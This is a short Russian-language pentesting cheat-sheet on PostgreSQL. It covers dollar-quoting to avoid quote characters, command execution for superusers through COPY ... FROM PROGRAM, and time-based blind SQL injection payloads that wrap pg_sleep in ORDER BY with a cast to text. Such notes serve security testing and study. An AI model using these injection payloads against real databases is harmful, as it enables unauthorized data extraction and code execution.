# postgres

Выведет quer, потому что $\[somestring]$ - это вроде кавычки

```
SELECT $test$quer$test$
```

Code Execution

Если есть права суперпользователя в базе, то можно исполнять код с помощью функций СУБД: `COPY TO` и `FROM PROGRAM`.

## Time Based SQLi and VOID-type

Есть одна маленькая проблема с эксплуатацией Time-Based SQLi. Функция pg\_sleep возвращает VOID, а этот тип не применим в некоторых запросах, например, в Order By:

```sql
SELECT * 
FROM pg_user 
ORDER BY "usename",
  (
    SELECT 
      CASE 
        WHEN COUNT((SELECT usename FROM pg_user))<>1 
        THEN pg_sleep(10) 
        ELSE '' 
      END
  );
```

этот запрос вернет ошибку:

```
could not identify an ordering operator for type void
```

Чтобы использовать pg\_sleep в order by запросах, надо конвертнуть результат в text:

```sql
SELECT * 
FROM pg_user 
ORDER BY "usename",
  (
    SELECT 
      CASE 
        WHEN COUNT((SELECT usename FROM pg_user))<>1 
        THEN pg_sleep(10) 
        ELSE '' 
      END
  )::text;
```
